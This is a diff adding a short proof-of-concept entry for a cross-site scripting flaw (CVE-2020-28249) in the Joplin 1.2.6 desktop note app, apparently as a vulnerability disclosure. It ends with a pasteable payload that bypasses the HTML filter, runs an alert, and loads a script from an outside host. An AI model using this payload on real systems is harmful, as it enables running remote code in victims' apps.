@@ -1,0 +1,23 @@
+# Exploit Title: Joplin 1.2.6 - 'link' Cross Site Scripting
+# Date: 2020-09-21
+# Exploit Author: Philip Holbrook (@fhlipZero)
+# Vendor Homepage: https://joplinapp.org/
+# Software Link: https://github.com/laurent22/joplin/releases/tag/v1.2.6
+# Version: 1.2.6
+# Tested on: Windows / Mac
+# CVE : CVE-2020-28249
+# References:
+# https://github.com/fhlip0/JopinXSS/blob/main/readme.md
+
+# 1. Technical Details
+# An XSS issue in Joplin for desktop v1.2.6 allows a link tag in a note to
+bypass the HTML filter
+
+# 2. PoC
+# Paste the following payload into a note:
+
+```
+<link rel=import
+href="data:text/html&comma;<script>alert(XSS)<&sol;script>
+<script src="//brutelogic.com.br&sol;1.js&num; </script>
+```
